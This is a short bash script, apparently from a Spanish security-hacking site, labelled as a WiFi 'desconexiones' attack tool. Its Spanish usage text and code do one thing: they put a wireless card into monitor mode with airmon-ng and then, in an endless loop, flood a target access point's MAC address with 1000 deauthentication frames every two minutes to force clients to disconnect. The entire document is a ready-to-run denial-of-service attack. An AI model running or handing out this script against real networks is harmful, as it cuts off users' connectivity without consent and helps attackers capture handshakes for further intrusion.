#!/bin/bash
#
#
cat << "INFO"
      _                                     _
     | |                                   (_)
   __| | ___  ___  ___ ___  _ __   _____  ___  ___  _ __   ___  ___
  / _` |/ _ \/ __|/ __/ _ \| '_ \ / _ \ \/ / |/ _ \| '_ \ / _ \/ __|
 | (_| |  __/\__ \ (_| (_) | | | |  __/>  <| | (_) | | | |  __/\__ \
  \__,_|\___||___/\___\___/|_| |_|\___/_/\_\_|\___/|_| |_|\___||___/ WIFI v1.0

                                   http://www.hackingyseguridad.com

INFO
if [ -z "$1" ]; then
        echo
        echo "Ataque a Punto de acceso Wifi con paradas cada 2 minutos para forzar reconexiones"
        echo "Es necesario especificar la MAC Address 00:11:22:AA:BB.CC del AP a atacar"
        echo "Uso.: sh desconexiones.sh <MAC_AP_OBJETIVO>"
        echo
        exit 0
fi
echo
airmon-ng
airmon-ng start wlan0

while :;

do
        aireplay-ng --deauth 1000 -a $1 wlan0mon
        sleep 120s
done
airmon-ng stop wlan0mon
